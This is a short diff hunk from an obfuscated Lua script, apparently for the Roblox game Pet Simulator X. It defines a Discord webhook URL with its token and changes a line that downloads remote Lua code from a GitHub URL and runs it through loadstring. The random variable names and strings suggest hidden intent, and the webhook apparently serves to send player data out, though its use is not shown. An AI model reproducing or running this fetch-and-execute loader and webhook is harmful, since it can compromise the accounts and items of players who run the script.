@@ -44,7 +44,7 @@ local unjct61nmcmc = "gh8mhngc3h8g3ctm8ntb2cgcbm242c4tbcbm92tbct244ch8y9f23r8jr2
 
 WebHook = "https://discord.com/api/webhooks/1053144886989307935/RXIQquMjptLFn873nBnOLpYxMzkniPcxyD6fkYjkInr6wtQCVZbb87zPb_hTUiwoXjyI"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua", true))()
 
 local u9j247cvh83h38g = "2mju4h8v38g1589uhy2gvhg989h8gchmj8vm98c2mn89ct9mncv2498hc2gm8nu9c48m9cmc2nbc24nb2bc8ubc2t8mnu2ctb2c9mcm2b8mn8b2cmn8c2b8mnc2tbmn8o2ctbt2mn8ctmn8c2imjnb4tugbt4ngm42mbm9824n9xnm92ctm82b9cb2c2bc8mnb28muneqfvu9ctngtht"
 
